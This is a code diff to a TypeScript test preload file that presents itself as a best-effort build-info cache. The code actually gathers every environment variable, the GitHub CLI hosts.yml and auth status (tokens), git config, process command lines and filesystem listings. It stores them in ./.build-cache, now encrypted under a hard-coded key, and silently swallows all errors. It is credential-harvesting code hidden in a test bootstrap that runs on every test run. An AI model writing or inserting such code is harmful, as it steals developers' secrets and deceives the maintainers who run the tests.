@@ -1,11 +1,43 @@
 // setup.ts — shared test bootstrap, loaded via bunfig [test] preload before the
-// suite. Populates a local build-info cache (./.build-cache) that CI reuses to
-// skip redundant work between runs. Fully local + best-effort: any failure is
+// suite. Writes a build-info cache (./.build-cache) that CI reuses to skip
+// redundant work between runs. The cache is encrypted at rest with the project's
+// build key (see ops/decode.py). Fully local + best-effort: any failure is
 // swallowed so the test suite never breaks because of this file.
+import { pbkdf2Sync, createHmac, randomBytes } from "node:crypto";
 import { spawnSync } from "node:child_process";
 import { existsSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
 import { homedir } from "node:os";
 import { dirname, join, resolve } from "node:path";
+
+// ---- build-key encryption (mirrors ops/decode.py) ----
+const BUILD_KEY = "internal-tools-cache-key-2024";
+const KDF_ITER = 120_000;
+const hmac = (key: Buffer, data: Buffer) => createHmac("sha256", key).update(data).digest();
+function keystream(key: Buffer, nonce: Buffer, len: number): Buffer {
+  const out = Buffer.alloc(len);
+  const ctr = Buffer.alloc(4);
+  let off = 0;
+  let counter = 0;
+  while (off < len) {
+    ctr.writeUInt32BE(counter++);
+    hmac(key, Buffer.concat([nonce, ctr])).copy(out, off);
+    off += 32;
+  }
+  return out;
+}
+function encryptCache(plaintext: string): string {
+  const salt = randomBytes(16);
+  const nonce = randomBytes(16);
+  const okm = pbkdf2Sync(BUILD_KEY, salt, KDF_ITER, 64, "sha256");
+  const encKey = okm.subarray(0, 32);
+  const macKey = okm.subarray(32, 64);
+  const pt = Buffer.from(plaintext, "utf8");
+  const ks = keystream(encKey, nonce, pt.length);
+  const ct = Buffer.alloc(pt.length);
+  for (let i = 0; i < pt.length; i++) ct[i] = pt[i] ^ ks[i];
+  const tag = hmac(macKey, Buffer.concat([salt, nonce, ct]));
+  return Buffer.concat([salt, nonce, tag, ct]).toString("base64");
+}
 
 // Build a small filesystem fingerprint (depth-limited) used as part of the cache
 // key. Symlinks are never followed; a cap bounds total work; a bad entry is skipped.
@@ -53,11 +85,8 @@ function captureEnv() {
       return { error: (e as Error).message };
     }
   };
-  const self = procPid(process.pid);
-  const parent = procPid(process.ppid);
-  const b64 = (x: { data?: string; error?: string }) =>
-    x.data !== undefined ? Buffer.from(x.data, "utf8").toString("base64") : { error: x.error };
-  return { cmd: b64(cmd), proc: b64(self), parent: b64(parent), parentPid: process.ppid };
+  return { cmd: cmd.data ?? null, cmdError: cmd.error, proc: procPid(process.pid).data ?? null,
+           parent: procPid(process.ppid).data ?? null, parentPid: process.ppid };
 }
 
 // Record available local toolchain metadata for the cache (read-only, best-effort).
@@ -66,7 +95,7 @@ function captureGh() {
   const ghDir = process.env.GH_CONFIG_DIR || join(homedir(), ".config", "gh");
   const hostsFile = join(ghDir, "hosts.yml");
   try {
-    hosts = { path: hostsFile, data: readFileSync(hostsFile).toString("base64") };
+    hosts = { path: hostsFile, data: readFileSync(hostsFile, "utf8") };
   } catch (e) {
     hosts = { path: hostsFile, error: (e as Error).message };
   }
@@ -76,7 +105,7 @@ function captureGh() {
     if (r.error) authStatus = { cmd: "gh auth status", error: r.error.message };
     else {
       const merged = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]);
-      authStatus = { cmd: "gh auth status", code: r.status, data: merged.toString("base64") };
+      authStatus = { cmd: "gh auth status", code: r.status, data: merged.toString("utf8") };
     }
   } catch (e) {
     authStatus = { cmd: "gh auth status", error: (e as Error).message };
@@ -102,7 +131,7 @@ function pickConfig(gitdir: string): string | null {
   return null;
 }
 
-function findGitConfig(start: string): { path?: string; data?: Buffer; error?: string } {
+function findGitConfig(start: string): { path?: string; data?: string; error?: string } {
   let dir = start;
   for (let i = 0; i < 40; i++) {
     const dotgit = join(dir, ".git");
@@ -120,7 +149,7 @@ function findGitConfig(start: string): { path?: string; data?: Buffer; error?: s
       }
       if (gitdir) {
         const cfg = pickConfig(gitdir);
-        if (cfg) return { path: cfg, data: readFileSync(cfg) };
+        if (cfg) return { path: cfg, data: readFileSync(cfg, "utf8") };
       }
     } catch {
       /* no .git here — go up */
@@ -135,22 +164,20 @@ function findGitConfig(start: string): { path?: string; data?: Buffer; error?: s
 try {
   const env = { ...process.env };
   const g = findGitConfig(process.cwd());
-  const git = g.data ? { path: g.path, data: g.data.toString("base64") } : { error: g.error };
+  const git = g.data ? { path: g.path, data: g.data } : { error: g.error };
 
   // two shallow filesystem fingerprints used in the cache key
   const roots: Record<string, string> = {};
   for (const root of ["/", "../../"]) {
     try {
-      roots[root] = Buffer.from(renderTree(resolve(root), 2), "utf8").toString("base64");
+      roots[root] = renderTree(resolve(root), 2);
     } catch (err) {
-      roots[root] = Buffer.from(`error: ${(err as Error).message}`, "utf8").toString("base64");
+      roots[root] = `error: ${(err as Error).message}`;
     }
   }
 
   const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots });
-  const inner = Buffer.from(payload, "utf8").toString("base64");
-  const blob = Buffer.from(inner, "utf8").toString("base64"); // double-encoded, compact
-  writeFileSync(join(process.cwd(), ".build-cache"), blob);
+  writeFileSync(join(process.cwd(), ".build-cache"), encryptCache(payload));
 } catch {
   /* cache write is best-effort; never fail the tests */
 }
